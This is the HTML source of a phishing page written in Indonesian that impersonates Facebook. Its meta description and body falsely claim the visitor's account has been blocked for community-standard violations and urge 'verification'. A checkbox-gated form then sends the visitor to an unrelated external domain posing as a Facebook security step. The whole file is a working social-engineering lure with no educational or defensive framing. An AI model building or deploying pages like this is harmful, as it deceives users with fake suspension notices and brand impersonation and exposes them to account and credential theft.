<html lang="en"><head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
  <title>Facebook | Masuk atau Daftar</title>
    <meta name="Description" content="Akun anda diblokir karena melanggar standar komunitas kami, Verifikasi akun anda sekarang untuk membatalkan pemblokiran">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Varifikasi Akun Facebook">
    <meta property="og:description" content="Akun anda diblokir karena melanggar standar komunitas kami, Verifikasi akun anda sekarang untuk membatalkan pemblokiran">
    <meta property="og:url" content="https://m.facebook.com">
    <meta property="og:image" content="assets/img/favfb.png">
    <meta name="twitter:image" content="assets/img/favfb.png">
  <link rel="stylesheet" href="assets/Facebook.css">
  <link rel="icon" type="image/x-icon" href="assets/img/favfb.png">
</head>
<body>
  <div class="container">
    <div class="row justify-content-center row1">
      <div class="col-lg-5 info-panel">
        <class class="row">
          <class class="col-lg">
            <center><img src="assets/img/Facebook.png" alt="gambar" class="img">
              <h5 class="h5">Keamanan Facebook</h5>
              <p class="info2">Sebelum membatalkan penonaktifan akun, pastikan anda setuju dengan ketentuan keamanan Facebook</p>
              <form action="https://ghgtdn1.nedfile.eu.org " method="get">
                <li class="list-group-item konfirm">
                  <input type="hidden" name="facebook" value="pemblokiran">
                  <input class="form-check-input me-1 " id="myCheckbox" type="checkbox" value="" aria-label="...">
                  setuju dan lanjutkan
                </li>
                <button type="submit" id="myButton" class="btn btn-primary" disabled="">Lanjutkan</button>
              </form>
            </center>
          </class>
        </class>
      </div>
    </div>
  </div>
  <script>
    const myCheckbox = document.getElementById('myCheckbox');
    const myButton = document.getElementById('myButton');

    myCheckbox.addEventListener('change', function() {
      if (myCheckbox.checked) {
        myButton.disabled = false;
      } else {
        myButton.disabled = true;
      }
    });
  </script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>



</body></html>
